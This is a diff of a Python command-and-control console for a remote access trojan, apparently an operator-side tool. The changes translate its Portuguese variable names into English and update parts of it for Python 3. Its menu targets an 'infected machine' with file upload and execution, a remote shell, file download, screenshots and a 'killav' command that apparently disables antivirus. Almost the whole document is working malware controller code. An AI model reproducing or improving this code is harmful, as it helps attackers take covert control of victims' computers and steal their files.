@@ -1,20 +1,11 @@
 #!/bin/bash/env python
-# coding=UTF-8
-# by Tarcisio marinho
-# github.com/tarcisio-marinho
 
-import os
-import datetime
-import time
-import socket
-import sha
-import subprocess
-import sys
+import os, datetime, time, socket, subprocess, sys
+from hashlib import sha1 as sha
 
-# cores
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
-def ajuda():
+def help():
     print('{0}Comandos{1}:\n{2}upload{3} - Escolha um arquivo para fazer upload na maquina infectada.').format(YELLOW, END, RED, END)
     print('{0}shell{1} - Para obter uma shell na maquina do cliente.').format(RED, END)
     print('{0}execute{1} - Executa um programa na maquina infectada.\n Ex: execute payload.exe').format(RED, END)
@@ -24,41 +15,41 @@ def ajuda():
     print('{0}clear{1} - Limpa a tela.').format(RED, END)
     print('{0}exit{1} - Sai do programa.').format(RED, END)
 
-def execute(s, nome_programa):
-    if(len(nome_programa.split(' ')) == 1):
+def execute(s, program_name):
+    if(len(program_name.split(' ')) == 1):
         try:
-            nome_programa = raw_input('Digite o nome do programa: ')
+            program_name = input('Digite o nome do programa: ')
         except KeyboardInterrupt:
             return
     else:
-        arquivo = nome_programa.split(' ')
-        arquivo.remove('execute')
-        nome_programa = ' '.join(arquivo)
+        file = program_name.split(' ')
+        file.remove('execute')
+        program_name = ' '.join(file)
 
     s.send('6')
-    s.send(nome_programa)
-    retorno = s.recv(1)
-    if(retorno == '1'):
+    s.send(program_name)
+    ret = s.recv(1)
+    if(ret == '1'):
         print('Arquivo não existe')
-    elif(retorno == '0'):
+    elif(ret == '0'):
         print('Executando')
 
-def upload(s, caminho_arquivo=False):
-    if(not caminho_arquivo):
-        comando = subprocess.Popen('zenity --file-selection --title Escolha_um_arquivo', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        retorno = comando.stdout.read()     # caminho do arquivo selecionado
-        nome_arquivo = os.path.basename(retorno)    # nome do arquivo selecionado
-        retorno = retorno.replace('\n','')
-        caminho_arq = retorno.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
-        if(os.path.isfile(retorno)):
+def upload(s, filepath=False):
+    if(not filepath):
+        command = subprocess.Popen('zenity --file-selection --title choose a file', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        ret = command.stdout.read()     
+        filename = os.path.basename(ret)    
+        ret = ret.replace('\n','')
+        arq_path = ret.replace(" ", r"\ ").replace(" (", r" \("). replace(")", r"\)")
+        if(os.path.isfile(ret)):
             s.send('1') # upload
-            print('Enviando arquivo: '+ nome_arquivo)
+            print('Enviando arquivo: '+ filename)
             try:
-                f = open(caminho_arq, 'rb')
+                f = open(arq_path, 'rb')
             except IOError:
-                f = open(retorno, 'rb')
+                f = open(ret, 'rb')
             ler = f.read(1024)
-            l = str(nome_arquivo) + '+/-' + ler
+            l = str(filename) + '+/-' + ler
             while(l):
                 s.send(l)
                 l = f.read(1024)
@@ -71,31 +62,32 @@ def upload(s, caminho_arquivo=False):
     else:
         pass
 
-def download(s, path):
-    caminho = os.path.expanduser('~')+'/Desktop/'
-    caminho2 = os.path.expanduser('~')+'/Área\ de\ Trabalho/'
-    if(os.path.isdir(caminho)):
-        caminho_correto = caminho
-    elif(os.path.isdir(caminho2)):
-        caminho_correto = caminho2
+def download(s, desktop_path):
+    desktop_path = os.path.expanduser('~')+'/Desktop/'
+    path2 = os.path.expanduser('~') + r'/Área\ de\ Trabalho/'
+    if(os.path.isdir(desktop_path)):
+        right_path = desktop_path
+    elif(os.path.isdir(path2)):
+        right_path = path2
 
-    if(len(path.split(' ')) == 1):
+    if(len(desktop_path.split(' ')) == 1):
         try:
-            arquivo = raw_input('Nome do arquivo: ')
+            filename = input('Nome do arquivo: ')
         except KeyboardInterrupt:
             return
     else:
-        arquivo = path.split(' ')
-        arquivo.remove('download')
-        arquivo = ' '.join(arquivo)
+        filename = desktop_path.split(' ')
+        filename.remove('download')
+        filename = ' '.join(filename)
 
 
     s.send('3')
-    s.send(arquivo)
-    existe = s.recv(1024)
-    if(existe.split('+/-')[0]=='True'):
-        f = open(caminho_correto + arquivo, 'wb')
-        j = existe.split('+/-')[1]
+    s.send(filename)
+    exists = s.recv(1024)
+
+    if(exists.split('+/-')[0]=='True'):
+        f = open(right_path + filename, 'wb')
+        j = exists.split('+/-')[1]
         l = s.recv(1024)
         l = j + l
         while(l):
@@ -105,7 +97,7 @@ def download(s, path):
         print('Baixado')
 
     else:
-        print('Arquivo ' + arquivo +' não existe.')
+        print('Arquivo ' + filename +' não existe.')
 
 def screenshot(s):
     s.send('5')
@@ -130,71 +122,74 @@ def shell(s):
     s.send('2') # shell
     while True:
         try:
-            executar = raw_input('\33[93m~$ \033[0m')
+            executar = input('\33[93m~$ \033[0m')
             s.send(executar)
             if(executar == 'exit'):
                 break
             retorno = s.recv(500000)
             if(not retorno):
                 print('maquina desconectada, reconectando ...')
-                conecta('')
+                connect('127.0.0.1', 1025)
             else:
                 print(retorno)
         except KeyboardInterrupt:
             break
 
-def identificador(comand, s):
-    comando = comand.split(' ')
-    tam = len(comando)
-    if(comando[0] == 'upload'):
+def parser(comand, s):
+    command = comand.split(' ')[0]
+
+    if(command == 'upload'):
         upload(s)
-    elif(comando[0] == 'shell'):
+    elif(command == 'shell'):
         shell(s)
-    elif(comando[0] == 'download'):
+    elif(command == 'download'):
         download(s, comand)
-    elif(comando[0] == 'screenshot'):
+    elif(command == 'screenshot'):
         screenshot(s)
-    elif(comando[0] == 'execute'):
+    elif(command == 'execute'):
         execute(s, comand)
-    elif(comando[0]=='killav'):
+    elif(command=='killav'):
         killav(s)
-    elif(comando[0] == 'help' or comando[0] == 'ajuda'):
-        ajuda()
-    elif(comando[0] == 'clear'):
+    elif(command == 'help' or command == 'ajuda'):
+        help()
+    elif(command == 'clear'):
         os.system('clear')
-    elif(comando[0] == 'exit'):
+    elif(command == 'exit'):
         sys.exit('Você escolheu sair')
     else:
         print('{0}Comando errado, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)
         return
 
-def conecta(meuIP):
-    enviado = False
+def connect(ip, port):
+    send = False
+    
     while True:
-        porta=1025
         socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # se der ctrl + c, ele para de escutar na porta
-        socket_obj.bind((meuIP, porta))
-        socket_obj.listen(1) # escutando conexões
-        if(enviado == False):
-            print('{0}[+] Aguardando conexões...').format(GREEN)
+        socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
+        socket_obj.bind((ip, port))
+        socket_obj.listen(1) 
+        
+        if(not send):
+            print('{0}[+] Aguardando conexões...'.format(GREEN))
         try:
-    	    conexao,endereco=socket_obj.accept()
+    	    connection, address = socket_obj.accept()
         except KeyboardInterrupt:
             exit()
-        retorno = conexao.recv(1024)
-        if(enviado == False):
-            print(retorno)
+            
+        retrn = connection.recv(1024)
+        if(send == False):
+            print(retrn)
         while True:
             try:
                 try:
-                    comando = raw_input('\033[0m-> ')
+                    command = input('\033[0m-> ')
                 except KeyboardInterrupt:
                     sys.exit()
-                identificador(comando, conexao)
+                parser(command, connection)
             except socket.error as e: # socket.shutdown(socket.SHUT_WR)
-                enviado = True
+                print(str(e))
+                send = True
                 break
 
 if __name__ == '__main__':
-    conecta('')
+    connect('127.0.0.1', 1025)
